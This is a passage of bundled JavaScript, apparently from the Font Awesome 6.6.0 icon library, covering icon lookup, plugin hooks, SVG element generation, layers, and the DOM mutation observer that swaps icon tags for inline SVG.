        givenPrefix = cls;
        acc.prefix = getCanonicalPrefix(cls, {
          family
        });
      } else if (iconName) {
        acc.iconName = iconName;
      } else if (cls !== config.replacementClass && !nonDuotoneFamilyIds.some((familyName) => cls === famProps[familyName])) {
        acc.rest.push(cls);
      }
      if (!skipLookups && acc.prefix && acc.iconName) {
        const shim = givenPrefix === "fa" ? byOldName(acc.iconName) : {};
        const aliasIconName = byAlias(acc.prefix, acc.iconName);
        if (shim.prefix) {
          givenPrefix = null;
        }
        acc.iconName = shim.iconName || aliasIconName || acc.iconName;
        acc.prefix = shim.prefix || acc.prefix;
        if (acc.prefix === "far" && !styles["far"] && styles["fas"] && !config.autoFetchSvg) {
          acc.prefix = "fas";
        }
      }
      return acc;
    }, emptyCanonicalIcon());
    if (values.includes("fa-brands") || values.includes("fab")) {
      canonical.prefix = "fab";
    }
    if (values.includes("fa-duotone") || values.includes("fad")) {
      canonical.prefix = "fad";
    }
    if (!canonical.prefix && family === r && (styles["fass"] || config.autoFetchSvg)) {
      canonical.prefix = "fass";
      canonical.iconName = byAlias(canonical.prefix, canonical.iconName) || canonical.iconName;
    }
    if (!canonical.prefix && family === o && (styles["fasds"] || config.autoFetchSvg)) {
      canonical.prefix = "fasds";
      canonical.iconName = byAlias(canonical.prefix, canonical.iconName) || canonical.iconName;
    }
    if (canonical.prefix === "fa" || givenPrefix === "fa") {
      canonical.prefix = getDefaultUsablePrefix() || "fas";
    }
    return canonical;
  }
  var Library = class {
    constructor() {
      this.definitions = {};
    }
    add() {
      for (var _len = arguments.length, definitions = new Array(_len), _key = 0; _key < _len; _key++) {
        definitions[_key] = arguments[_key];
      }
      const additions = definitions.reduce(this._pullDefinitions, {});
      Object.keys(additions).forEach((key) => {
        this.definitions[key] = {
          ...this.definitions[key] || {},
          ...additions[key]
        };
        defineIcons(key, additions[key]);
        const longPrefix = PREFIX_TO_LONG_STYLE[a][key];
        if (longPrefix) defineIcons(longPrefix, additions[key]);
        build();
      });
    }
    reset() {
      this.definitions = {};
    }
    _pullDefinitions(additions, definition) {
      const normalized = definition.prefix && definition.iconName && definition.icon ? {
        0: definition
      } : definition;
      Object.keys(normalized).map((key) => {
        const {
          prefix: prefix2,
          iconName,
          icon: icon2
        } = normalized[key];
        const aliases = icon2[2];
        if (!additions[prefix2]) additions[prefix2] = {};
        if (aliases.length > 0) {
          aliases.forEach((alias) => {
            if (typeof alias === "string") {
              additions[prefix2][alias] = icon2;
            }
          });
        }
        additions[prefix2][iconName] = icon2;
      });
      return additions;
    }
  };
  var _plugins = [];
  var _hooks = {};
  var providers = {};
  var defaultProviderKeys = Object.keys(providers);
  function registerPlugins(nextPlugins, _ref) {
    let {
      mixoutsTo: obj
    } = _ref;
    _plugins = nextPlugins;
    _hooks = {};
    Object.keys(providers).forEach((k) => {
      if (defaultProviderKeys.indexOf(k) === -1) {
        delete providers[k];
      }
    });
    _plugins.forEach((plugin2) => {
      const mixout = plugin2.mixout ? plugin2.mixout() : {};
      Object.keys(mixout).forEach((tk) => {
        if (typeof mixout[tk] === "function") {
          obj[tk] = mixout[tk];
        }
        if (typeof mixout[tk] === "object") {
          Object.keys(mixout[tk]).forEach((sk) => {
            if (!obj[tk]) {
              obj[tk] = {};
            }
            obj[tk][sk] = mixout[tk][sk];
          });
        }
      });
      if (plugin2.hooks) {
        const hooks = plugin2.hooks();
        Object.keys(hooks).forEach((hook) => {
          if (!_hooks[hook]) {
            _hooks[hook] = [];
          }
          _hooks[hook].push(hooks[hook]);
        });
      }
      if (plugin2.provides) {
        plugin2.provides(providers);
      }
    });
    return obj;
  }
  function chainHooks(hook, accumulator) {
    for (var _len = arguments.length, args = new Array(_len > 2 ? _len - 2 : 0), _key = 2; _key < _len; _key++) {
      args[_key - 2] = arguments[_key];
    }
    const hookFns = _hooks[hook] || [];
    hookFns.forEach((hookFn) => {
      accumulator = hookFn.apply(null, [accumulator, ...args]);
    });
    return accumulator;
  }
  function callHooks(hook) {
    for (var _len2 = arguments.length, args = new Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) {
      args[_key2 - 1] = arguments[_key2];
    }
    const hookFns = _hooks[hook] || [];
    hookFns.forEach((hookFn) => {
      hookFn.apply(null, args);
    });
    return void 0;
  }
  function callProvided() {
    const hook = arguments[0];
    const args = Array.prototype.slice.call(arguments, 1);
    return providers[hook] ? providers[hook].apply(null, args) : void 0;
  }
  function findIconDefinition(iconLookup) {
    if (iconLookup.prefix === "fa") {
      iconLookup.prefix = "fas";
    }
    let {
      iconName
    } = iconLookup;
    const prefix2 = iconLookup.prefix || getDefaultUsablePrefix();
    if (!iconName) return;
    iconName = byAlias(prefix2, iconName) || iconName;
    return iconFromMapping(library.definitions, prefix2, iconName) || iconFromMapping(namespace.styles, prefix2, iconName);
  }
  var library = new Library();
  var noAuto = () => {
    config.autoReplaceSvg = false;
    config.observeMutations = false;
    callHooks("noAuto");
  };
  var dom = {
    i2svg: function() {
      let params = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
      if (IS_DOM) {
        callHooks("beforeI2svg", params);
        callProvided("pseudoElements2svg", params);
        return callProvided("i2svg", params);
      } else {
        return Promise.reject(new Error("Operation requires a DOM of some kind."));
      }
    },
    watch: function() {
      let params = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
      const {
        autoReplaceSvgRoot
      } = params;
      if (config.autoReplaceSvg === false) {
        config.autoReplaceSvg = true;
      }
      config.observeMutations = true;
      domready(() => {
        autoReplace({
          autoReplaceSvgRoot
        });
        callHooks("watch", params);
      });
    }
  };
  var parse = {
    icon: (icon2) => {
      if (icon2 === null) {
        return null;
      }
      if (typeof icon2 === "object" && icon2.prefix && icon2.iconName) {
        return {
          prefix: icon2.prefix,
          iconName: byAlias(icon2.prefix, icon2.iconName) || icon2.iconName
        };
      }
      if (Array.isArray(icon2) && icon2.length === 2) {
        const iconName = icon2[1].indexOf("fa-") === 0 ? icon2[1].slice(3) : icon2[1];
        const prefix2 = getCanonicalPrefix(icon2[0]);
        return {
          prefix: prefix2,
          iconName: byAlias(prefix2, iconName) || iconName
        };
      }
      if (typeof icon2 === "string" && (icon2.indexOf("".concat(config.cssPrefix, "-")) > -1 || icon2.match(ICON_SELECTION_SYNTAX_PATTERN))) {
        const canonicalIcon = getCanonicalIcon(icon2.split(" "), {
          skipLookups: true
        });
        return {
          prefix: canonicalIcon.prefix || getDefaultUsablePrefix(),
          iconName: byAlias(canonicalIcon.prefix, canonicalIcon.iconName) || canonicalIcon.iconName
        };
      }
      if (typeof icon2 === "string") {
        const prefix2 = getDefaultUsablePrefix();
        return {
          prefix: prefix2,
          iconName: byAlias(prefix2, icon2) || icon2
        };
      }
    }
  };
  var api = {
    noAuto,
    config,
    dom,
    parse,
    library,
    findIconDefinition,
    toHtml
  };
  var autoReplace = function() {
    let params = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
    const {
      autoReplaceSvgRoot = DOCUMENT
    } = params;
    if ((Object.keys(namespace.styles).length > 0 || config.autoFetchSvg) && IS_DOM && config.autoReplaceSvg) api.dom.i2svg({
      node: autoReplaceSvgRoot
    });
  };
  function domVariants(val, abstractCreator) {
    Object.defineProperty(val, "abstract", {
      get: abstractCreator
    });
    Object.defineProperty(val, "html", {
      get: function() {
        return val.abstract.map((a2) => toHtml(a2));
      }
    });
    Object.defineProperty(val, "node", {
      get: function() {
        if (!IS_DOM) return;
        const container = DOCUMENT.createElement("div");
        container.innerHTML = val.html;
        return container.children;
      }
    });
    return val;
  }
  function asIcon(_ref) {
    let {
      children,
      main,
      mask,
      attributes,
      styles: styles2,
      transform
    } = _ref;
    if (transformIsMeaningful(transform) && main.found && !mask.found) {
      const {
        width,
        height
      } = main;
      const offset = {
        x: width / height / 2,
        y: 0.5
      };
      attributes["style"] = joinStyles({
        ...styles2,
        "transform-origin": "".concat(offset.x + transform.x / 16, "em ").concat(offset.y + transform.y / 16, "em")
      });
    }
    return [{
      tag: "svg",
      attributes,
      children
    }];
  }
  function asSymbol(_ref) {
    let {
      prefix: prefix2,
      iconName,
      children,
      attributes,
      symbol
    } = _ref;
    const id = symbol === true ? "".concat(prefix2, "-").concat(config.cssPrefix, "-").concat(iconName) : symbol;
    return [{
      tag: "svg",
      attributes: {
        style: "display: none;"
      },
      children: [{
        tag: "symbol",
        attributes: {
          ...attributes,
          id
        },
        children
      }]
    }];
  }
  function makeInlineSvgAbstract(params) {
    const {
      icons: {
        main,
        mask
      },
      prefix: prefix2,
      iconName,
      transform,
      symbol,
      title,
      maskId,
      titleId,
      extra,
      watchable = false
    } = params;
    const {
      width,
      height
    } = mask.found ? mask : main;
    const isUploadedIcon = prefix2 === "fak";
    const attrClass = [config.replacementClass, iconName ? "".concat(config.cssPrefix, "-").concat(iconName) : ""].filter((c2) => extra.classes.indexOf(c2) === -1).filter((c2) => c2 !== "" || !!c2).concat(extra.classes).join(" ");
    let content = {
      children: [],
      attributes: {
        ...extra.attributes,
        "data-prefix": prefix2,
        "data-icon": iconName,
        "class": attrClass,
        "role": extra.attributes.role || "img",
        "xmlns": "http://www.w3.org/2000/svg",
        "viewBox": "0 0 ".concat(width, " ").concat(height)
      }
    };
    const uploadedIconWidthStyle = isUploadedIcon && !~extra.classes.indexOf("fa-fw") ? {
      width: "".concat(width / height * 16 * 0.0625, "em")
    } : {};
    if (watchable) {
      content.attributes[DATA_FA_I2SVG] = "";
    }
    if (title) {
      content.children.push({
        tag: "title",
        attributes: {
          id: content.attributes["aria-labelledby"] || "title-".concat(titleId || nextUniqueId())
        },
        children: [title]
      });
      delete content.attributes.title;
    }
    const args = {
      ...content,
      prefix: prefix2,
      iconName,
      main,
      mask,
      maskId,
      transform,
      symbol,
      styles: {
        ...uploadedIconWidthStyle,
        ...extra.styles
      }
    };
    const {
      children,
      attributes
    } = mask.found && main.found ? callProvided("generateAbstractMask", args) || {
      children: [],
      attributes: {}
    } : callProvided("generateAbstractIcon", args) || {
      children: [],
      attributes: {}
    };
    args.children = children;
    args.attributes = attributes;
    if (symbol) {
      return asSymbol(args);
    } else {
      return asIcon(args);
    }
  }
  function makeLayersTextAbstract(params) {
    const {
      content,
      width,
      height,
      transform,
      title,
      extra,
      watchable = false
    } = params;
    const attributes = {
      ...extra.attributes,
      ...title ? {
        "title": title
      } : {},
      "class": extra.classes.join(" ")
    };
    if (watchable) {
      attributes[DATA_FA_I2SVG] = "";
    }
    const styles2 = {
      ...extra.styles
    };
    if (transformIsMeaningful(transform)) {
      styles2["transform"] = transformForCss({
        transform,
        startCentered: true,
        width,
        height
      });
      styles2["-webkit-transform"] = styles2["transform"];
    }
    const styleString = joinStyles(styles2);
    if (styleString.length > 0) {
      attributes["style"] = styleString;
    }
    const val = [];
    val.push({
      tag: "span",
      attributes,
      children: [content]
    });
    if (title) {
      val.push({
        tag: "span",
        attributes: {
          class: "sr-only"
        },
        children: [title]
      });
    }
    return val;
  }
  function makeLayersCounterAbstract(params) {
    const {
      content,
      title,
      extra
    } = params;
    const attributes = {
      ...extra.attributes,
      ...title ? {
        "title": title
      } : {},
      "class": extra.classes.join(" ")
    };
    const styleString = joinStyles(extra.styles);
    if (styleString.length > 0) {
      attributes["style"] = styleString;
    }
    const val = [];
    val.push({
      tag: "span",
      attributes,
      children: [content]
    });
    if (title) {
      val.push({
        tag: "span",
        attributes: {
          class: "sr-only"
        },
        children: [title]
      });
    }
    return val;
  }
  var {
    styles: styles$1
  } = namespace;
  function asFoundIcon(icon2) {
    const width = icon2[0];
    const height = icon2[1];
    const [vectorData] = icon2.slice(4);
    let element = null;
    if (Array.isArray(vectorData)) {
      element = {
        tag: "g",
        attributes: {
          class: "".concat(config.cssPrefix, "-").concat(DUOTONE_CLASSES.GROUP)
        },
        children: [{
          tag: "path",
          attributes: {
            class: "".concat(config.cssPrefix, "-").concat(DUOTONE_CLASSES.SECONDARY),
            fill: "currentColor",
            d: vectorData[0]
          }
        }, {
          tag: "path",
          attributes: {
            class: "".concat(config.cssPrefix, "-").concat(DUOTONE_CLASSES.PRIMARY),
            fill: "currentColor",
            d: vectorData[1]
          }
        }]
      };
    } else {
      element = {
        tag: "path",
        attributes: {
          fill: "currentColor",
          d: vectorData
        }
      };
    }
    return {
      found: true,
      width,
      height,
      icon: element
    };
  }
  var missingIconResolutionMixin = {
    found: false,
    width: 512,
    height: 512
  };
  function maybeNotifyMissing(iconName, prefix2) {
    if (!PRODUCTION && !config.showMissingIcons && iconName) {
      console.error('Icon with name "'.concat(iconName, '" and prefix "').concat(prefix2, '" is missing.'));
    }
  }
  function findIcon(iconName, prefix2) {
    let givenPrefix = prefix2;
    if (prefix2 === "fa" && config.styleDefault !== null) {
      prefix2 = getDefaultUsablePrefix();
    }
    return new Promise((resolve, reject) => {
      if (givenPrefix === "fa") {
        const shim = byOldName(iconName) || {};
        iconName = shim.iconName || iconName;
        prefix2 = shim.prefix || prefix2;
      }
      if (iconName && prefix2 && styles$1[prefix2] && styles$1[prefix2][iconName]) {
        const icon2 = styles$1[prefix2][iconName];
        return resolve(asFoundIcon(icon2));
      }
      maybeNotifyMissing(iconName, prefix2);
      resolve({
        ...missingIconResolutionMixin,
        icon: config.showMissingIcons && iconName ? callProvided("missingIconAbstract") || {} : {}
      });
    });
  }
  var noop$1 = () => {
  };
  var p$2 = config.measurePerformance && PERFORMANCE && PERFORMANCE.mark && PERFORMANCE.measure ? PERFORMANCE : {
    mark: noop$1,
    measure: noop$1
  };
  var preamble = 'FA "6.6.0"';
  var begin = (name) => {
    p$2.mark("".concat(preamble, " ").concat(name, " begins"));
    return () => end(name);
  };
  var end = (name) => {
    p$2.mark("".concat(preamble, " ").concat(name, " ends"));
    p$2.measure("".concat(preamble, " ").concat(name), "".concat(preamble, " ").concat(name, " begins"), "".concat(preamble, " ").concat(name, " ends"));
  };
  var perf = {
    begin,
    end
  };
  var noop$2 = () => {
  };
  function isWatched(node) {
    const i2svg = node.getAttribute ? node.getAttribute(DATA_FA_I2SVG) : null;
    return typeof i2svg === "string";
  }
  function hasPrefixAndIcon(node) {
    const prefix2 = node.getAttribute ? node.getAttribute(DATA_PREFIX) : null;
    const icon2 = node.getAttribute ? node.getAttribute(DATA_ICON) : null;
    return prefix2 && icon2;
  }
  function hasBeenReplaced(node) {
    return node && node.classList && node.classList.contains && node.classList.contains(config.replacementClass);
  }
  function getMutator() {
    if (config.autoReplaceSvg === true) {
      return mutators.replace;
    }
    const mutator = mutators[config.autoReplaceSvg];
    return mutator || mutators.replace;
  }
  function createElementNS(tag) {
    return DOCUMENT.createElementNS("http://www.w3.org/2000/svg", tag);
  }
  function createElement(tag) {
    return DOCUMENT.createElement(tag);
  }
  function convertSVG(abstractObj) {
    let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {
      ceFn = abstractObj.tag === "svg" ? createElementNS : createElement
    } = params;
    if (typeof abstractObj === "string") {
      return DOCUMENT.createTextNode(abstractObj);
    }
    const tag = ceFn(abstractObj.tag);
    Object.keys(abstractObj.attributes || []).forEach(function(key) {
      tag.setAttribute(key, abstractObj.attributes[key]);
    });
    const children = abstractObj.children || [];
    children.forEach(function(child) {
      tag.appendChild(convertSVG(child, {
        ceFn
      }));
    });
    return tag;
  }
  function nodeAsComment(node) {
    let comment = " ".concat(node.outerHTML, " ");
    comment = "".concat(comment, "Font Awesome fontawesome.com ");
    return comment;
  }
  var mutators = {
    replace: function(mutation) {
      const node = mutation[0];
      if (node.parentNode) {
        mutation[1].forEach((abstract) => {
          node.parentNode.insertBefore(convertSVG(abstract), node);
        });
        if (node.getAttribute(DATA_FA_I2SVG) === null && config.keepOriginalSource) {
          let comment = DOCUMENT.createComment(nodeAsComment(node));
          node.parentNode.replaceChild(comment, node);
        } else {
          node.remove();
        }
      }
    },
    nest: function(mutation) {
      const node = mutation[0];
      const abstract = mutation[1];
      if (~classArray(node).indexOf(config.replacementClass)) {
        return mutators.replace(mutation);
      }
      const forSvg = new RegExp("".concat(config.cssPrefix, "-.*"));
      delete abstract[0].attributes.id;
      if (abstract[0].attributes.class) {
        const splitClasses = abstract[0].attributes.class.split(" ").reduce((acc, cls) => {
          if (cls === config.replacementClass || cls.match(forSvg)) {
            acc.toSvg.push(cls);
          } else {
            acc.toNode.push(cls);
          }
          return acc;
        }, {
          toNode: [],
          toSvg: []
        });
        abstract[0].attributes.class = splitClasses.toSvg.join(" ");
        if (splitClasses.toNode.length === 0) {
          node.removeAttribute("class");
        } else {
          node.setAttribute("class", splitClasses.toNode.join(" "));
        }
      }
      const newInnerHTML = abstract.map((a2) => toHtml(a2)).join("\n");
      node.setAttribute(DATA_FA_I2SVG, "");
      node.innerHTML = newInnerHTML;
    }
  };
  function performOperationSync(op) {
    op();
  }
  function perform(mutations, callback) {
    const callbackFunction = typeof callback === "function" ? callback : noop$2;
    if (mutations.length === 0) {
      callbackFunction();
    } else {
      let frame = performOperationSync;
      if (config.mutateApproach === MUTATION_APPROACH_ASYNC) {
        frame = WINDOW.requestAnimationFrame || performOperationSync;
      }
      frame(() => {
        const mutator = getMutator();
        const mark = perf.begin("mutate");
        mutations.map(mutator);
        mark();
        callbackFunction();
      });
    }
  }
  var disabled = false;
  function disableObservation() {
    disabled = true;
  }
  function enableObservation() {
    disabled = false;
  }
  var mo$1 = null;
  function observe(options) {
    if (!MUTATION_OBSERVER) {
      return;
    }
    if (!config.observeMutations) {
      return;
    }
    const {
      treeCallback = noop$2,
      nodeCallback = noop$2,
      pseudoElementsCallback = noop$2,
      observeMutationsRoot = DOCUMENT
    } = options;
    mo$1 = new MUTATION_OBSERVER((objects) => {
      if (disabled) return;
      const defaultPrefix = getDefaultUsablePrefix();
      toArray2(objects).forEach((mutationRecord) => {
        if (mutationRecord.type === "childList" && mutationRecord.addedNodes.length > 0 && !isWatched(mutationRecord.addedNodes[0])) {
          if (config.searchPseudoElements) {
            pseudoElementsCallback(mutationRecord.target);
          }
          treeCallback(mutationRecord.target);
        }
        if (mutationRecord.type === "attributes" && mutationRecord.target.parentNode && config.searchPseudoElements) {
          pseudoElementsCallback(mutationRecord.target.parentNode);
        }
        if (mutationRecord.type === "attributes" && isWatched(mutationRecord.target) && ~ATTRIBUTES_WATCHED_FOR_MUTATION.indexOf(mutationRecord.attributeName)) {
          if (mutationRecord.attributeName === "class" && hasPrefixAndIcon(mutationRecord.target)) {
            const {
              prefix: prefix2,
              iconName
            } = getCanonicalIcon(classArray(mutationRecord.target));
            mutationRecord.target.setAttribute(DATA_PREFIX, prefix2 || defaultPrefix);
            if (iconName) mutationRecord.target.setAttribute(DATA_ICON, iconName);
          } else if (hasBeenReplaced(mutationRecord.target)) {
            nodeCallback(mutationRecord.target);
          }
        }
      });
    });
    if (!IS_DOM) return;
    mo$1.observe(observeMutationsRoot, {
      childList: true,
      attributes: true,
      characterData: true,
      subtree: true
    });
  }
  function disconnect() {
    if (!mo$1) return;
    mo$1.disconnect();
  }
  function styleParser(node) {
    const style = node.getAttribute("style");
    let val = [];
    if (style) {
      val = style.split(";").reduce((acc, style2) => {
        const styles2 = style2.split(":");
        const prop = styles2[0];
        const value = styles2.slice(1);
        if (prop && value.length > 0) {
          acc[prop] = value.join(":").trim();
        }
        return acc;
      }, {});
    }
    return val;
  }
  function classParser(node) {
    const existingPrefix = node.getAttribute("data-prefix");
    const existingIconName = node.getAttribute("data-icon");
    const innerText = node.innerText !== void 0 ? node.innerText.trim() : "";
    let val = getCanonicalIcon(classArray(node));
    if (!val.prefix) {
      val.prefix = getDefaultUsablePrefix();
    }
    if (existingPrefix && existingIconName) {
      val.prefix = existingPrefix;
      val.iconName = existingIconName;
    }
    if (val.iconName && val.prefix) {
      return val;
    }
    if (val.prefix && innerText.length > 0) {
      val.iconName = byLigature(val.prefix, node.innerText) || byUnicode(val.prefix, toHex(node.innerText));
    }
    if (!val.iconName && config.autoFetchSvg && node.firstChild && node.firstChild.nodeType === Node.TEXT_NODE) {
      val.iconName = node.firstChild.data;
    }
    return val;
  }
  function attributesParser(node) {
    const extraAttributes = toArray2(node.attributes).reduce((acc, attr) => {
      if (acc.name !== "class" && acc.name !== "style") {
        acc[attr.name] = attr.value;
      }
      return acc;
    }, {});
    const title = node.getAttribute("title");
    const titleId = node.getAttribute("data-fa-title-id");
    if (config.autoA11y) {
      if (title) {
        extraAttributes["aria-labelledby"] = "".concat(config.replacementClass, "-title-").concat(titleId || nextUniqueId());
      } else {
        extraAttributes["aria-hidden"] = "true";
        extraAttributes["focusable"] = "false";
      }
    }
    return extraAttributes;
  }
  function blankMeta() {
    return {
      iconName: null,
      title: null,
      titleId: null,
      prefix: null,
      transform: meaninglessTransform,
      symbol: false,
      mask: {
        iconName: null,
        prefix: null,
        rest: []
      },
      maskId: null,
      extra: {
        classes: [],
        styles: {},
        attributes: {}
      }
    };
  }
  function parseMeta(node) {
    let parser = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {
      styleParser: true
    };
    const {
      iconName,
      prefix: prefix2,
      rest: extraClasses
    } = classParser(node);
    const extraAttributes = attributesParser(node);
    const pluginMeta = chainHooks("parseNodeAttributes", {}, node);
    let extraStyles = parser.styleParser ? styleParser(node) : [];
    return {
      iconName,
      title: node.getAttribute("title"),
      titleId: node.getAttribute("data-fa-title-id"),
      prefix: prefix2,
      transform: meaninglessTransform,
      mask: {
        iconName: null,
        prefix: null,
        rest: []
      },
      maskId: null,
      symbol: false,
      extra: {
        classes: extraClasses,
        styles: extraStyles,
        attributes: extraAttributes
      },
      ...pluginMeta
    };
  }
  var {
    styles: styles$2
  } = namespace;
  function generateMutation(node) {
    const nodeMeta = config.autoReplaceSvg === "nest" ? parseMeta(node, {
      styleParser: false
    }) : parseMeta(node);
    if (~nodeMeta.extra.classes.indexOf(LAYERS_TEXT_CLASSNAME)) {
      return callProvided("generateLayersText", node, nodeMeta);
    } else {
      return callProvided("generateSvgReplacementMutation", node, nodeMeta);
    }
  }
  var knownPrefixes = /* @__PURE__ */ new Set();
  FAMILIES.map((family) => {
    knownPrefixes.add("fa-".concat(family));
  });
  Object.keys(PREFIX_TO_STYLE[a]).map(knownPrefixes.add.bind(knownPrefixes));
  Object.keys(PREFIX_TO_STYLE[r]).map(knownPrefixes.add.bind(knownPrefixes));
  Object.keys(PREFIX_TO_STYLE[o]).map(knownPrefixes.add.bind(knownPrefixes));
  knownPrefixes = [...knownPrefixes];
  function onTree(root) {
    let callback = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
    if (!IS_DOM) return Promise.resolve();
    const htmlClassList = DOCUMENT.documentElement.classList;
    const hclAdd = (suffix) => htmlClassList.add("".concat(HTML_CLASS_I2SVG_BASE_CLASS, "-").concat(suffix));
    const hclRemove = (suffix) => htmlClassList.remove("".concat(HTML_CLASS_I2SVG_BASE_CLASS, "-").concat(suffix));
    const prefixes2 = config.autoFetchSvg ? knownPrefixes : FAMILIES.map((f$$1) => "fa-".concat(f$$1)).concat(Object.keys(styles$2));
    if (!prefixes2.includes("fa")) {
      prefixes2.push("fa");
    }
    const prefixesDomQuery = [".".concat(LAYERS_TEXT_CLASSNAME, ":not([").concat(DATA_FA_I2SVG, "])")].concat(prefixes2.map((p$$1) => ".".concat(p$$1, ":not([").concat(DATA_FA_I2SVG, "])"))).join(", ");
    if (prefixesDomQuery.length === 0) {
      return Promise.resolve();
    }
    let candidates = [];
    try {
      candidates = toArray2(root.querySelectorAll(prefixesDomQuery));
    } catch (e$$1) {
    }
    if (candidates.length > 0) {
      hclAdd("pending");
      hclRemove("complete");
    } else {
      return Promise.resolve();
    }
    const mark = perf.begin("onTree");
    const mutations = candidates.reduce((acc, node) => {
      try {
        const mutation = generateMutation(node);
        if (mutation) {
          acc.push(mutation);
        }
      } catch (e$$1) {
        if (!PRODUCTION) {
          if (e$$1.name === "MissingIcon") {
            console.error(e$$1);
          }
        }
      }
      return acc;
    }, []);
    return new Promise((resolve, reject) => {
      Promise.all(mutations).then((resolvedMutations) => {
        perform(resolvedMutations, () => {
          hclAdd("active");
          hclAdd("complete");
          hclRemove("pending");
          if (typeof callback === "function") callback();
          mark();
          resolve();
        });
      }).catch((e$$1) => {
        mark();
        reject(e$$1);
      });
    });
  }
  function onNode(node) {
    let callback = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
    generateMutation(node).then((mutation) => {
      if (mutation) {
        perform([mutation], callback);
      }
    });
  }
  function resolveIcons(next) {
    return function(maybeIconDefinition) {
      let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
      const iconDefinition = (maybeIconDefinition || {}).icon ? maybeIconDefinition : findIconDefinition(maybeIconDefinition || {});
      let {
        mask
      } = params;
      if (mask) {
        mask = (mask || {}).icon ? mask : findIconDefinition(mask || {});
      }
      return next(iconDefinition, {
        ...params,
        mask
      });
    };
  }
  var render = function(iconDefinition) {
    let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {
      transform = meaninglessTransform,
      symbol = false,
      mask = null,
      maskId = null,
      title = null,
      titleId = null,
      classes = [],
      attributes = {},
      styles: styles2 = {}
    } = params;
    if (!iconDefinition) return;
    const {
      prefix: prefix2,
      iconName,
      icon: icon2
    } = iconDefinition;
    return domVariants({
      type: "icon",
      ...iconDefinition
    }, () => {
      callHooks("beforeDOMElementCreation", {
        iconDefinition,
        params
      });
      if (config.autoA11y) {
        if (title) {
          attributes["aria-labelledby"] = "".concat(config.replacementClass, "-title-").concat(titleId || nextUniqueId());
        } else {
          attributes["aria-hidden"] = "true";
          attributes["focusable"] = "false";
        }
      }
      return makeInlineSvgAbstract({
        icons: {
          main: asFoundIcon(icon2),
          mask: mask ? asFoundIcon(mask.icon) : {
            found: false,
            width: null,
            height: null,
            icon: {}
          }
        },
        prefix: prefix2,
        iconName,
        transform: {
          ...meaninglessTransform,
          ...transform
        },
        symbol,
        title,
        maskId,
        titleId,
        extra: {
          attributes,
          styles: styles2,
          classes
        }
      });
    });
  };
  var ReplaceElements = {
    mixout() {
      return {
        icon: resolveIcons(render)
      };
    },
    hooks() {
      return {
        mutationObserverCallbacks(accumulator) {
          accumulator.treeCallback = onTree;
          accumulator.nodeCallback = onNode;
          return accumulator;
        }
      };
    },
    provides(providers$$1) {
      providers$$1.i2svg = function(params) {
        const {
          node = DOCUMENT,
          callback = () => {
          }
        } = params;
        return onTree(node, callback);
      };
      providers$$1.generateSvgReplacementMutation = function(node, nodeMeta) {
        const {
          iconName,
          title,
          titleId,
          prefix: prefix2,
          transform,
          symbol,
          mask,
          maskId,
          extra
        } = nodeMeta;
        return new Promise((resolve, reject) => {
          Promise.all([findIcon(iconName, prefix2), mask.iconName ? findIcon(mask.iconName, mask.prefix) : Promise.resolve({
            found: false,
            width: 512,
            height: 512,
            icon: {}
          })]).then((_ref) => {
            let [main, mask2] = _ref;
            resolve([node, makeInlineSvgAbstract({
              icons: {
                main,
                mask: mask2
              },
              prefix: prefix2,
              iconName,
              transform,
              symbol,
              maskId,
              title,
              titleId,
              extra,
              watchable: true
            })]);
          }).catch(reject);
        });
      };
      providers$$1.generateAbstractIcon = function(_ref2) {
        let {
          children,
          attributes,
          main,
          transform,
          styles: styles2
        } = _ref2;
        const styleString = joinStyles(styles2);
        if (styleString.length > 0) {
          attributes["style"] = styleString;
        }
        let nextChild;
        if (transformIsMeaningful(transform)) {
          nextChild = callProvided("generateAbstractTransformGrouping", {
            main,
            transform,
            containerWidth: main.width,
            iconWidth: main.width
          });
        }
        children.push(nextChild || main.icon);
        return {
          children,
          attributes
        };
      };
    }
  };
  var Layers = {
    mixout() {
      return {
        layer(assembler) {
          let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
          const {
            classes = []
          } = params;
          return domVariants({
            type: "layer"
          }, () => {
            callHooks("beforeDOMElementCreation", {
              assembler,
              params
            });
            let children = [];
            assembler((args) => {
              Array.isArray(args) ? args.map((a2) => {
                children = children.concat(a2.abstract);
              }) : children = children.concat(args.abstract);
            });
            return [{
              tag: "span",
              attributes: {
                class: ["".concat(config.cssPrefix, "-layers"), ...classes].join(" ")
              },
              children
            }];
          });
        }
      };
    }
  };
  var LayersCounter = {
    mixout() {
      return {
        counter(content) {
          let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
          const {
            title = null,
            classes = [],
            attributes = {},
            styles: styles2 = {}
          } = params;
          return domVariants({
            type: "counter",
            content
          }, () => {
            callHooks("beforeDOMElementCreation", {
              content,
              params
            });
            return makeLayersCounterAbstract({
              content: content.toString(),
              title,
              extra: {
                attributes,
                styles: styles2,
                classes: ["".concat(config.cssPrefix, "-layers-counter"), ...classes]
              }
            });
          });
        }
      };
    }
  };
  var LayersText = {
    mixout() {
      return {
        text(content) {
          let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
          const {
            transform = meaninglessTransform,
            title = null,
            classes = [],
            attributes = {},
            styles: styles2 = {}
          } = params;
          return domVariants({
            type: "text",
            content
          }, () => {
            callHooks("beforeDOMElementCreation", {
              content,
              params
            });
            return makeLayersTextAbstract({
              content,
              transform: {
                ...meaninglessTransform,
                ...transform
              },
              title,
              extra: {
                attributes,
                styles: styles2,
                classes: ["".concat(config.cssPrefix, "-layers-text"), ...classes]
              }
            });
          });
        }
      };
    },
    provides(providers$$1) {
      providers$$1.generateLayersText = function(node, nodeMeta) {
        const {
          title,
          transform,
          extra
        } = nodeMeta;
        let width = null;
        let height = null;
        if (IS_IE) {
          const computedFontSize = parseInt(getComputedStyle(node).fontSize, 10);
          const boundingClientRect = node.getBoundingClientRect();
          width = boundingClientRect.width / computedFontSize;
          height = boundingClientRect.height / computedFontSize;
        }
        if (config.autoA11y && !title) {
          extra.attributes["aria-hidden"] = "true";
        }
